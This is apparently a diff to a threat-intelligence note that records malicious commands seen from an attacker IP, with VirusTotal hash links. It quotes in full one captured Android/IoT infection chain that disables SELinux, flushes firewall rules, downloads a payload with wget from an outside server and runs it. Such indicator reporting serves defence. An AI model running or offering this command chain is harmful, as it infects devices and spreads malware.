@@ -16,7 +16,7 @@ https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46
 d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 Attacker IP : 103.67.196.50
 toybox pgrep -a M arm arm7 x86 x86_64 | toybox xargs toybox kill -9;su 0 toybox pgrep -a M arm arm7 x86 x86_64 | su 0 toybox xargs toybox kill -9;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://103.28.33.96/and || su 0 busybox wget http://103.28.33.96/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
